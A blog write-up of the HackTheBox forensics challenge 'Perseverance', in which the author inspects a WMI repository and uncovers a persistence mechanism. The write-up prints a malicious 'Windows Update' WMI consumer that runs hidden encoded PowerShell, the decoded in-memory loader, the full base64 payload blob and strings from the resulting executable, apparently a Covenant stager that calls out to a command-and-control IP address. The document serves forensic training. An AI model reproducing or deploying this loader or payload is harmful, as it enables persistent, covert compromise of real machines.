---
layout: post
title: HackTheBox - Perseverance Challenge
date: 2022-09-27 15:41 +0200
author: Arcee
tags: htb box easy forensics
categories: [HackTheBox, Challenge, Forensics]
---
Easy Forensics Challenge 

## Challenge:

**Name**: Perseverance

**Category**: Forensics

**Solve date**: 27-09-2022

**Challenge Description**: During a recent security assessment of a well-known consulting company, the competent team found some employees' credentials in publicly available breach databases. Thus, they called us to trace down the actions performed by these users. During the investigation, it turned out that one of them had been compromised. Although their security engineers took the necessary steps to remediate and secure the user and the internal infrastructure, the user was getting compromised repeatedly. Narrowing down our investigation to find possible persistence mechanisms, we are confident that the malicious actors use WMI to establish persistence. You are given the WMI repository of the user's workstation. Can you analyze and expose their technique?.

## Investigation

We get 5 files: OBJECTS.DATA, MAPPING3.MAP, MAPPING2.MAP, MAPPING1.MAP, INDEX.BTR. 

The description also talks about WMI, which is Windows Management Instrumentation, which is a built-in tool that is normal in Windows environments. WMI can be used in all attack phases following exploitation (according to [https://netsecninja.github.io/dfir-notes/wmi-forensics/](https://netsecninja.github.io/dfir-notes/wmi-forensics/))

This site also gives us some information on the files we have received. All files are from the C:\Windows\System32\wbem\Repository folder: 

- [OBJECTS.DATA](http://OBJECTS.DATA) contains objects managed by WMI
- INDEX.BTR indexes of files imported into OBJECTS.DATA
- MAPPING[1-3].MAP correlates data in [OBJECTS.DATA](http://OBJECTS.DATA) and INDEX.BTR.

The website also links to a python script that can parse WMI logs: [https://github.com/davidpany/WMI_Forensics](https://github.com/davidpany/WMI_Forensics)

Specifically the [PyWMIPersistenceFinder.py](http://PyWMIPersistenceFinder.py) is designed to find WMI persistance in OBJECTS.DATA. 

```bash
$ python2 PyWMIPersistenceFinder.py OBJECTS.DATA

    Enumerating FilterToConsumerBindings...
    2 FilterToConsumerBinding(s) Found. Enumerating Filters and Consumers...

    Bindings:

        SCM Event Log Consumer-SCM Event Log Filter
                (Common binding based on consumer and filter names, possibly legitimate)
            Consumer: NTEventLogEventConsumer ~ SCM Event Log Consumer ~ sid ~ Service Control Manager

            Filter: 
                Filter name:  SCM Event Log Filter
                Filter Query: select * from MSFT_SCMEventLogEvent

        Windows Update-Windows Update
            Consumer: 
                Consumer Type: CommandLineEventConsumer
                Arguments:     cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAnAFIATwBPAFQAXABjAGkAbQB2ADIAOgBXAGkAbgAzADIAXwBNAGUAbQBvAHIAeQBBAHIAcgBhAHkARABlAHYAaQBjAGUAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAUAByAG8AcABlAHIAdAB5ACcAXQAuAFYAYQBsAHUAZQA7AHMAdgAgAG8AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQApADsAcwB2ACAAZAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKABbAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGYAaQBsAGUAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAOwBzAHYAIABiACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AKAAxADAAMgA0ACkAKQA7AHMAdgAgAHIAIAAoAGcAdgAgAGQAKQAuAFYAYQBsAHUAZQAuAFIAZQBhAGQAKAAoAGcAdgAgAGIAKQAuAFYAYQBsAHUAZQAsADAALAAxADAAMgA0ACkAOwB3AGgAaQBsAGUAKAAoAGcAdgAgAHIAKQAuAFYAYQBsAHUAZQAgAC0AZwB0ACAAMAApAHsAKABnAHYAIABvACkALgBWAGEAbAB1AGUALgBXAHIAaQB0AGUAKAAoAGcAdgAgAGIAKQAuAFYAYQBsAHUAZQAsADAALAAoAGcAdgAgAHIAKQAuAFYAYQBsAHUAZQApADsAcwB2ACAAcgAgACgAZwB2ACAAZAApAC4AVgBhAGwAdQBlAC4AUgBlAGEAZAAoACgAZwB2ACAAYgApAC4AVgBhAGwAdQBlACwAMAAsADEAMAAyADQAKQA7AH0AWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAoAGcAdgAgAG8AKQAuAFYAYQBsAHUAZQAuAFQAbwBBAHIAcgBhAHkAKAApACkALgBFAG4AdAByAHkAUABvAGkAbgB0AC4ASQBuAHYAbwBrAGUAKAAwACwAQAAoACwAWwBzAHQAcgBpAG4AZwBbAF0AXQBAACgAKQApACkAfABPAHUAdAAtAE4AdQBsAGwA
                Consumer Name: Windows Update

            Filter: 
                Filter name:  Windows Update
                Filter Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 325

    Thanks for using PyWMIPersistenceFinder! Please contact @DavidPany with questions, bugs, or suggestions.

    Please review FireEye's whitepaper for additional WMI persistence details:
        https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
```

We see a powershell instance here that is executing a command, which is encoded in base64. We use cyberchef to decode this (we also need decode text from UTF-16LE as there are dots between the characters)

```bash
$file = ([WmiClass]'ROOT\cimv2:Win32_MemoryArrayDevice').Properties['Property'].Value;
sv o (New-Object IO.MemoryStream);
sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress));
sv b (New-Object Byte[](1024));
sv r (gv d).Value.Read((gv b).Value,0,1024);
while((gv r).Value -gt 0){
	(gv o).Value.Write((gv b).Value,0,(gv r).Value);
	sv r (gv d).Value.Read((gv b).Value,0,1024);
}
[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null
```

We see that the powershell command uses Win32_MemoryArrayDevice. This class represents the properties of the computer system memory array and mapped addresses. Which can be used to access the hosts memory. We try to find more occurrences of Win32_MemoryArrayDevice in the code: 

```bash
$ strings OBJECTS.DATA | grep -i "MemoryArrayDevice" -C5
Override
GroupComponent
__thisNAMESPACE
__NAMESPACE
S_1_5_21_4058070148_2814875178_2081404498_1001
Win32_MemoryArrayDevice
Property
string
7Vp9cFzVdT/37e7b1dpa662slS1L8tpC9uoTfdqW4xhLsmQJJGHrwx8UYq92n6TFq33Le7u2ZI8T07QESmggzRedkgSYTpIZQsMEJiFpS2hIp07KlAHSCQ0hdj4mZeAPIP0gtLH7O/e9Xe1aEiT9J5OZ7Pqde77uueece87Vu5JHb7qXXETkxnPlCtHXyf7so/f+nMcT2PyNAD1e8uyWr4uRZ7dMziWscNo0Zs3ofDgWTaWMTHhaD5vZVDiRCu+/cSI8b8T11tJS/zWOjYMDRCNCoQtNj0/n7F6krbRGtBE1glBs3neHAMJ4TjjehW2Z25mTG6VTzhyF9v0pUZn8tzTmB/lZgN0b3y1IrLf2N8jFsg/88xWQPtBDBXRrRl/IYHwuYusWxlpg4kSrqSeNmOPDCUenuVhvH1Hf/8dF/jziODUkTXvon1qIvlJFJOyl1N/W3g4lgjl+JYINURtrLdhRtyG2TW0qvVMi7WpWKZh+yws9E3Q6gkT513jNCuAG49u85oEC/GQeN28HWnnPJtipD21ufiACi/4IbDStVc0nIDuHWnabX1tN64PwzV3fUrntgx4gl1UNjlhrIK0/z5IIIm6SiqXma6va8BbbCC7Z8BbZKHebC8pqRnzFRsqXjPiKjXjMdS6kqJST9S3GAsDKVfOZFbhe1fxvN4h1IM5hA9yFNDeLVcZqPtPloXR5SURjqj5YfzkEQ8IIsrWNEMlUGmwytNlvlLOW3yvFkfVMrDFr2MDaSAVTpVpppRECppVuMCrlqK0xNkjE2MjDGquKFQNhbgkL6fBb1cxYF6lh8bqQUYvR2My8MkwKM7cspJX9ecLYwkxNC2iasZXRoLa2+h6PzKhWovkjdWA+VF9pPg+PHqrfIF1/qH4jrFzD/tZLcZWmOdgmLWhjkW1srTz8Boo2sh24elkN8C5EeFoDA+lcuXQrgr1Ry9evL6+wfIxVaBWVRiPLKyJN7HuzxI0W1m1lxrWcTHamPOQz2nitbbt+gbWC2yLtTG0PlUd2fRSMEi1idLDyvyKCSCew5p1ahbbd6mKT7pz0Z7wv/+5x9sV8vWibDBSW2vQ+ONANKm+xWGnJ1lWTd7AwUnm0PKJFNLexE+R1M1euXGEvNI/m0zySZ+xisIIBuQdGDzeotr089Ipr2ysc5m4wdpfCziuB4LbLIXTmJuN94L0cKm/Y9WEZecPVkXdhzVAu8oZVI9f8BWF358NuWPLO0ViyUjhNBtyAgBu0hlzAhh1waPWAndkyWk3V1kf2sPj9THkjqEg1JHXLK+3CqYzgzFaNvZKlVWprpU79RltpQ32VjWzcJEdto91aVaj0Klnpskwj13FWPD/6B3Qz2mqDVDL22b3Vy0NVSKvKtckmbZ22qdLoY7zabs4arcZpzhqnOWu0ars5a+zmrDH6uSHtDq26B7kX5bWR/SyqNQZsDdmQtSGtNrfSZri5eXlDyk5856pOrCnuxM0rd2LYzlq4sN1C5Y1OoTS+a6E0/raF0rhSoSxn2oXSiEJp1Bp/Pwrlfhzz2OLCQqlZVijOLm9xxq3YuS2hqsggi7StDqbVSsPaliL7PdJ+rnJkXWwNaVtzdVEHr+pWqYvL714XdSvXxTV2kq4prosmpy6a3rUumn7bumhaqS6WM+26aEJdNGlNvx91gRen966LyAEW4lXQH/pLY1gO66tyexjCHqpn+f0Km8g7ih18yLgeWtte2VbeHLmBjTUbI2yn1MZHGR9jm3jF9r/C77i9I/Z7ogpDP8R4CSPfP3gRfrV9G+AdjG+BGbjq3fKFEvtBXdA6Ltw2FwUV+Z6quSIHOc2Kiq32qbmtXltMBpnckCPLhMusZuIQpyhoE+Y1heJ9hWImzKFCcbxQzISZLBTfWShmwry3UPxIoZgJ8/FC8XOFYibMHxSIrXHit+wJQL81CbhGNaY4xv9gpcM8bZP3apZxhMFRAEeieJcp51nLlMuWK5etqly7XLl2VeXm5crNqyrvXq68e7myt7FWOYsXaHfjVsV1TiLXK5FjnDTrJi5LL99PdsvbiupyG38EHl/BytsUWV8oP01xRW4GO4sfn8KvtvgculG1Zxm3sFNYRzYaj+udUbWNsS10Gt9NtUq/cpbfwJuvUWQPyVPQbs6g2/gA+yX58hTzq8pZfn0/3qwG3KHLWLyxlV/d1fN8W2gclOeDy27lvfZafRPX9wl5a7Pviqe6WttaO9s623tIdlcS8EX4VfdB3BcR+xD6qG4iYyZSsxZr3AnzQ+DXTU3Qc5X2HbnuwNQw3gPoIujn4HxdX9LIXdJBiiMVD5WU+EG8IzopZN8Ze8m+NPLdFxcHaecDfFTbeZA6zt1S9r1wRjflrr//q9hRqPSg8iFVpaclvEe5RV1Hn+O800+8abdKxxWGt3vuQX9P06/Bf8TNnLPqE+A8TAznPAz7RdpdR2vk3D2etNtPX3Td6vXTGt8bXpVM2PfTTz1vgPMDF0tNH+MnpHRI+S6kP3EzfNR7BdbuJF4l5mH4aegH6LviiEelSelDhY/535eeHJX4aTf78FeC4b0Sft7LcKOLPf8zKX1Gws8C+ukB6YmqMLzougLO9hLGvyoY7nMzXOtlGJGabs8WgRUFr/ULmZOQzMCnpIefkz4873uL+VI66GH8WoXhJTnrl55/JD/d7+OcbPAwPCThduVWL+/EN+V+CPkto6c8T3kqJK6A8mCjB4Cr9MeijL6KbawAfw25QOHtQFKl5NpSRr+SlAcnt6AhcQwn9VbXLYDfcJ0AvM53i7KDvkYxJQT5LGC3hAnAg2yI7tjQjDoQ9AFJfYp+5DaUJerHSlZRaM7WpMewHwr9baMt61MWIfs3+VuTO3zf83xYcdNPJHW778eeQVCvNS+t4KHLNkWPqp2Kh8pamHqGDN91OBv7Wmyb33M3Cx9d71CHfC+gwsdblqz46WZJfZg+RncqqDhJ3behQ80qgSLNAD3uaPrpEbFE7QW1Lk+ZoMrkLni9DF+T/fJDif8XNyO97GLOkyrj35F8IeExyfmYh6UjPu621/lsob+X0mdoCT6HGJpVQRqxXxsB/dQu8fskbJCwx4EJcStdoiveNL1K53ynceo0qx8H/qr3M9jrX4onIE2LJ0mIPuUpGpazErRPPAM7d7suQPpZ17NUItpdL9AhOqq8RJr4iHgFsNT1c8Av+14HvIjKOoa5r1ODYAtR4G9Ru3gUbwk94kMuEu3ibdUjNDGsrhG9otkNTDzqqhKX6FnvFvCfp+2iRPS5msF50dshDolxd4+ICvb2kHC794m76ID3gPgStZeMAK8pGQcsLzkmbhMN3uMiITZ6dbGefKopqmmL73bgs+47YO3nvo+KBzlq6H/C+2lxn/gf7wOQtvgeFsN0p+8L4B9yPYJZf+J7TNwvdqPO2YcnwD/hehJRfML1Tdh5E3Y08RJxvD2IIko7fU+D89e+7eJL4qhyAfBtZOAx8UPfv4inxQbxMuDT6s/EBZFWXxMviW+Lt8QlcdnzK7FIXxAXaJEWBGf4We8V8Sq+HxdviiuiTLlEUW+F8ibHDs4XXVXKerkvt9Nd3rDyKzHr3qaUKK8rF2g91YgW5S4pvd+B3A93yT54jLhvnqR57OMWaqILSit6/jOA5Ti1W2kTfUvZR3XgPyyl35Lw2xJelLAMJ9xuZURxyZ8AP/X8BTpUJaa8gHdTUpwV7vNXvQDS91wFv+nF56DyhhyLeWn3ct4m+cPFhR5wy99z8moKzqOPoM6/wqI9e3uOH+883kZ7Bhb0WDajT2Sis7q5d9rh7o0dP74/YaWT0cX+ZNSybKac077inHYaHkhl53UzOp3UT7TTSMLKYHDmdKw4p4MGs6nYiRWFNDTa2z8x1NvRvYNm9czxqcnBXWyN9owa8WxS30tDNLFoZfT51uEbaUrqDB8myx4O6Cl4ktGBxqOZKM1bMcNMJqY5sNy0fiOZ1GOZhJGyWqV+IkYjRjROvfH4SjoTaT2WiCYTZ/Q4jemnD2QTcdrTbxgnE3q/kcpEEzCx9+Tx433R2Em8Zwwm9CRspdN6Kk7jOjIZ06WXCDJ2ctJkkr1FODodjMbjmCPx/kR6TjclyuqjumUhK9Rv6nE9lYEH/dHYnE7DqVPGSZ2Wkk7DvGGGJXF4ZBkYj5iJjD4C16QtuC3xASsWTes0gaRDvnjQNDJGzEhOLjIzF7kJK9F0JotxVM/MGfG+qKWTvQZ7bAIe7W7r6dfNTGImEUO62UkeJiZ7J+eAxnszeOeazrLEmE8nkrqZ25kC0X59Ojs7y25frR7lzI/ryeiCxKwl+XgWqZjXWQ2i6UQSYSxJnXKivsWMHfjhaDKr0ykJu+dvm7c6b2tvPRNLtOoL9i44G4B0xgyJTFk6B3YwkUoxOWga8xz/ji77LZImjSJyv3E6lUTxOORUuoA4oGfY1FDUmstPPjqfzONLag42kZ22bGw0monNyWQgHDYA/JSeiqbyFovCoSkzQdhS1Nu8kdELdgYJSMRlEvujyeQ0KlCGPaGbp3Tz3fVQqilrxjDnBxOpaBIvxeCN6ZnThnlyqSYda8X1ZDclqskpKgzz8zoii/UmZw1ozs1Tr7Wcx3EtUePRVNyYJ6cP8t7QcL+5mM4YS4w+AxUfTSFpiZRdmXOMxSR0ynpcn3Eamsai87qsi6UmpwOmkU0X0Ef06SGUMVK0xBtYiOlpidltMZyaMeyJuUXQY7cRFjdpfKLX9pITnYjpyMypBMyRvdN92USSKQtnBIa+7MwMyxxdI5HKjEZTfCRS0QGJ1VD+Ds45vuoUkptxNW9SX8jI08CeMmCahsk15xwgGVB2psey89P5PgW3NWZDOdgNvl+PyahyNLrGoVG3uSzsT0RnU4aVScQsXsdOlkW9upXfDLuJW3NngxO45ZwIzoEIdTSQjMaimDPCIJ9WeVO50mu10z1rRtNzi61XHU9yGp8JFk1LGDVxHRxeqmLLzlwBzanar89Es8nMspq3tXFQOAqFEifvef84+yi+2Wwyag4spE0UMx9o0r6sHRu1iw3TrTQOWBRohqkJK3nQSCZii3LTLNLtAUcW2+G1EB0NogcwzNjDjdO3ol6RuqQcbC8QAieTJtI4L8nOKUq8P5mA3zj7TiVMIzXPuKyqrGnmcQN7Rc6+k3NKyAOGYgzw04gHuCLHoUwmDcPj+m1Z3cpw2guoSYNfDmgUJ9kY/1m4IEU4uGb1Beo1zeiiXPcGfVFmmcd322qcI5Y+P51cJHlA9RvpRTLSxwduy0b5RwPjwyk9Ry2lI29Nrob2XLDXs7FheG1jBXWQ5/GnfIIGaZz6SaczwGYoTtR+gGbpNLAjeAw8g7g/HMWNedLROIMZZ8DpoDRuHDGiuk5wZmhMao7hO0Bd1EY3QWuMkCloUkU3OEehfwi2R+kALUCXOucgz8DObroW33bM20mtGHdhDo87nXEXtHcDtvHVp/MwLI1REmsnIOvDSh10mLLwrZfej28zVunAjFO4gXRAL4nL492TCKiHdoB1BItbuKhMwCBe9ehWTJulG+B+HK5MEw5tTI1TJxzFTzhMP4RxDIt1YeYNmNeHbwyvcH2wcxOWjkPnGJ2UocSRTrY7ivBjcIrHY9L+AOTD0B6Q0hHo8Xz2J4P5w+DbdjpAn3LW2Q/5EF0Pehp6UxjHwBuQdvvhzyLGWzG3Kx/HFOYPIoZjSNL18GcE60/JrViEFo+z+SQdBnUI0jZgk3JM0kFgJzEOADsKT4Ygm5L0DCSWXGE1/UkZ2xjGYazEkQ9TN+gz4HdKPm8Qnf/kiLNjI1jiMMQjcp+ySOYB0BzMPM3BPAd9Wjq70gzepmNym7IyTeNwdzpfA8tncJ1y1XQi6OUz6PzfJDBEEUEPGoJLpxMu7MAYh1IPvm3g7JI11ImHi3UXzE3L8owj0g7M2wYsCrNR2DqLGefAwaGHx0IFGZQCfyd02WaLtDqNFVswtxsZ1mFVBy8KfBpYt1yP67YFa3bIlLBvO0EJlx+F3b6HuIvmEdle8lPY+TKXFeNF3CVpBs5w2enEdxFddokByRFAE3gcd8U96MlCvULr165ofw/c4zNjcZVV0++xWnrFeXw2hFedF3bSXOxdoR+2t7kc0ZoZ+J2Um0IVXTLlUaS5E/pxSZGrhcT5r56F4a0oyClU8X5gu/HYS21FeW1FNS/CYV1KzmIPz0nuKDi8+zn9jrw+936O25nnDqAiYgiGbWUwNy4tWPJkmHWs84yu/IwhaPSi+3OSbik5hy+5cECW9iN0Az2Z4ABd78PTDO7ZfCSs144Hx7LnZswnFx4PR0se2woerx0pbYrQdbQdnpiwmYWPbaBaqZEaSHjtqJfrtBfpdKyo01Gk07miTmeRTteKOl1FOt0r6nQv6ZQWRkKlhT4XUh1FVGcR1VVEdWO9l9Wg2F2y/+udt1yse/XFNnKHhfC5wiQ8QDTtmLcluD5YUxHcIgJXgUAgWB8I1HgCwYZgS7C9xsNfMNdCErCpYIPkOSKtu0LrwTwfPsH3w36wJqCGRU2gxrWuTAg2WksVwUVAl18E1IpgQgkEPGFFVG+oLFMUKRK2AstqqVa4/VDhv+FBDcu6SSgB/jtIN0KQPJ/PQwKLgxlsUDmm8/fYw30cYY3HC/u+4PlPeqBw/n6EH1AgwAxPGIwHfWEXO+/zsadAPCTXCROjAqGpzKipVoltfpmH4PnHOIuKtPgEL4ZBWntCsv7OZj3tkWn0hYnTUk4emR1YBhoGDccVhZcSwvblO5wKRBsmH5g+BpJSpE/VmBSQ4bCb9uLfX0serPQjHz8+LwG/BI/hfPD8z+3hVTWsVFfXVEv9/1TJxbtX4lWCvdI7JFS6oAR4v3ptR36NAIK3s1cCfsKACB4KuL0ieIwFU8FDLAiOurxC8X3tzM2HN3ZdvMulBkcVVVHUALAN3tzmIl01vH+ihBSnqpCB4Kg/7Faqg7cEo5rujoD2Cee/OdbyXwQmldARvH2OGan8nXByzjROW8InnD/vuO2/7ny+4D9DfiP3fztX+DxS+J8mCW/duCzo8j4rf4Ol663xZFLKrtRTeN/KRv7wWf2zz/574T/v+l078ofP7+Lzfw==
AntiVirusProduct
Windows Defender

```

This looks like another base64 string that we can use. We use the magic option in CyberChef to see if it actually generates some output. Which it does if we use the Raw Inflate operation. Which gives us an executable file!

![Perseverance](/assets/img/posts/htb-ch-perseverance/cyberchef1.png)

```bash
MZ..........ÿÿ..¸.......@.........................................º..´	Í!¸.LÍ!This program cannot be run in DOS mode.

$.......PE..L...É+´b........à."...0..*..........ÊH... ...`....@.. ....................................@.................................xH..O............................`....................................................... ............... ..H............text...Ð(... ...*.................. ..`.reloc.......`.......,..............@..B........................................................¬H......H.......È-..°...........................................................6.(...
.(....*.s....&*...0..ú	......s
...
{...................Ë...............P.ð.................P.p.................P.............................°....<>9__3_0.<ExecuteStager>b__3_0.<>c__DisplayClass3_0.<>9__3_1.<ExecuteStager>b__3_1.IEnumerable`1.List`1.<>9__3_2.<ExecuteStager>b__3_2.Func`2.<ExecuteStager>b__3.HMACSHA256.get_UTF8.<>9.<Module>.H.System.IO.U.get_IV.set_IV.GenerateIV.data.mscorlib.<>c.System.Collections.Generic.Load.Add.System.Collections.Specialized.NewGuid.<CookieContainer>k__BackingField.Append.Replace.get_StackTrace.set_Mode.PaddingMode.CipherMode.get_Message.CredentialCache.Invoke.Enumerable.IDisposable.Console.WriteLine.get_NewLine.Escape.SecurityProtocolType.System.Core.Capture.MethodBase.Dispose.Parse.X509Certificate.Create.STAThreadAttribute.CompilerGeneratedAttribute.DebuggableAttribute.CompilationRelaxationsAttribute.RuntimeCompatibilityAttribute.Execute.Byte.get_Value.value.5mqms3q1.zci.exe.set_Padding.Encoding.UseCertPinning.FromBase64String.ToBase64String.DownloadString.UploadString.GetCertHashString.ToXmlString.ToString.GetString.Substring.Match.ComputeHash.CovenantCertHash.5mqms3q1.zci.Uri.uri.RemoteCertificateValidationCallback.set_ServerCertificateValidationCallback.TransformFinalBlock.NetworkCredential.set_SecurityProtocol.get_Item.System.SymmetricAlgorithm.AsymmetricAlgorithm.HashAlgorithm.Random.MessageTransform.ICryptoTransform.Boolean.Main.X509Chain.chain.System.Reflection.NameValueCollection.GroupCollection.WebHeaderCollection.Exception.MethodInfo.Group.System.Linq.Char.RSACryptoServiceProvider.StringBuilder.sender.Buffer.ServicePointManager.ExecuteStager.GruntStager.get_CookieContainer.set_CookieContainer.TextWriter.get_Error.GetEnumerator.RandomNumberGenerator..ctor..cctor.CreateDecryptor.CreateEncryptor.str.System.Diagnostics.GetMethods.Aes.System.Runtime.CompilerServices.DebuggingModes.SetCookies.cookies.GetTypes.System.Security.Cryptography.X509Certificates.GetBytes.bytes.args.ICredentials.set_Credentials.get_DefaultNetworkCredentials.set_UseDefaultCredentials.Contains.System.Text.RegularExpressions.get_Groups.get_Headers.CspParameters.SslPolicyErrors.errors.address.Concat.Format.format.Object.Select.System.Net.Set.Split.CookieWebClient.Environment.get_Current.get_Count.Decrypt.ValidateCert.cert.Invert.Convert.HttpWebRequest.GetWebRequest.ToList.MoveNext.System.Text.Regex.Array.get_Key.set_Key.System.Security.Cryptography.Assembly.BlockCopy.op_Equality.op_Inequality.System.Net.Security.get_Proxy.set_Proxy.IWebProxy.get_DefaultWebProxy......S.F.R.C.e.z.F.f.d..1G.g.w.d.W.d.o.d.F.9.X.T.T.F.f.d.z.R.z.X.2.p.1.c..#3.R.f.N.F.9.N.N.E.4.0.Z.z.N.t.M.2...5.0.X.1.Q.w.M.G.x.9..3h.t.t.p.:././.1.4.7...1.8.2...1.7.2...1.8.9.:.8.0....3V.X.N.l.c.i.1.B.Z.2.V.u.d.A.=.=.,.Q.2.9.v.a.2.l.l....T.W.9.6.a.W.x.s.Y.S.8.1.L.j.A.g.K.F.d.p.b.m.R.v.d.3.M.g.T.l.Q.g.N.i.4.x.K.S.B.B.c.H.B.s.Z.V.d.l.Y.k.t.p.d.C.8.1.M.z.c.u.M.z.Y.g.K.E.t.I.V.E.1.M.L.C.B.s.a.W.t.l.I.E.d.l.Y.2.t.v.K.S.B.D.a.H.J.v.b.W.U.v.N.D.E.u.M.C.4.y.M.j.I.4.L.j.A.g.U.2.F.m.Y.X.J.p.L.z.U.z.N.y.4.z.N.g.=.=.,.Q.V.N.Q.U.0.V.T.U.0.l.P.T.k.l.E.P.X.t.H.V.U.l.E.f.T.s.g.U.0.V.T.U.0.l.P.T.k.l.E.P.T.E.1.N.T.I.z.M.z.I.5.N.z.E.3.N.T.A.=....L.2.V.u.L.X.V.z.L.2.l.u.Z.G.V.4.L.m.h.0.b.W.w.=.,.L.2.V.u.L.X.V.z.L.2.R.v.Y.3.M.u.a.H.R.t.b.A.=.=.,.L.2.V.u.L.X.V.z.L.3.R.l.c.3.Q.u.a.H.R.t.b.A.=.=...¯i.=.a.1.9.e.a.2.3.0.6.2.d.b.9.9.0.3.8.6.a.3.a.4.7.8.c.b.8.9.d.5.2.e.&.d.a.t.a.=.{.0.}.&.s.e.s.s.i.o.n.=.7.5.d.b.-.9.9.b.1.-.2.5.f.e.4.e.9.a.f.b.e.5.8.6.9.6.-.3.2.0.b.e.a.7.3...
...1<.h.t.m.l.>.
. . . . .<.h.e.a.d.>.
. . . . . . . . .<.t.i.t.l.e.>.H.e.l.l.o. .W.o.r.l.d.!.<./.t.i.t.l.e.>.
. . . . .<./.h.e.a.d.>.
. . . . .<.b.o.d.y.>.
. . . . . . . . .<.p.>.H.e.l.l.o. .W.o.r.l.d.!.<./.p.>.
. . . . . . . . ././. .H.e.l.l.o. .W.o.r.l.d.!. .{.0.}.
. . . . .<./.b.o.d.y.>.
.<./.h.t.m.l.>...f.a.l.s.e...4.e.4.a.8.3.d.d.e.4...-...³{.{.".G.U.I.D.".:.".{.0.}.".,.".T.y.p.e.".:.{.1.}.,.".M.e.t.a.".:.".{.2.}.".,.".I.V.".:.".{.3.}.".,.".E.n.c.r.y.p.t.e.d.M.e.s.s.a.g.e.".:.".{.4.}.".,.".H.M.A.C.".:.".{.5.}.".}.}...0..
C.o.o.k.i.e...;...,..
{.G.U.I.D.}...1...2...\.{...{...{.{...}.}...}...{.0.}...(.?.'.g.r.o.u.p.0.'...*.)...{.1.}...(.?.'.g.r.o.u.p.1.'...*.)...{.2.}...(.?.'.g.r.o.u.p.2.'...*.)...{.3.}...(.?.'.g.r.o.u.p.3.'...*.)...{.4.}...(.?.'.g.r.o.u.p.4.'...*.)...{.5.}...(.?.'.g.r.o.u.p.5.'...*.)..
g.r.o.u.p.0..
g.r.o.u.p.1..
g.r.o.u.p.2..
g.r.o.u.p.3..
g.r.o.u.p.4..
g.r.o.u.p.5...Ü...:	D¸3]à#éÔ0.. .... ... ....Y.-......!....!....!....!.....%......).-.1.....................).............5..9........=. ..... ...........!.....y....
.....i.... ..........y.....y.....i......
........ .............5. ... ..............). ...... ...... ..... ............. .... ..... ...¡. ........ ............ .............................±. ........µ. ....µ. ...µ.....½. ....Á...!... ...9......9... .... ........... .... ...Å. ..... ... .... .... ......... ..... ...........Õ......Ý...Ý.......á... ....å. ....é. ..........õ.......	...A..!........ .... ..A.. ...ý. ...... ..... ...Q.....Y. ..U.Q. ...M.....·z\V.4à....M..............i.............	....!..... ..M
 ....].a.e.(..M..............T..WrapNonExceptionThrows................. H..........ºH... ......................¬H............_CorExeMain.mscoree.dll.....ÿ%. @..................................................................................................................................................................................................................................................................................................................@......Ì8......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
```

We again see something like an encoded text (which we can view more clearly if we add the Decode text UTF-16LE). This again looks like something that is base64. So we decode this again using Cyberchef:

![Perseverance](/assets/img/posts/htb-ch-perseverance/cyberchef2.png)

```bash
HTB{*****************}.Ûiÿýxï_6×½µóß4User-Agent
```

Which gives us our flag!
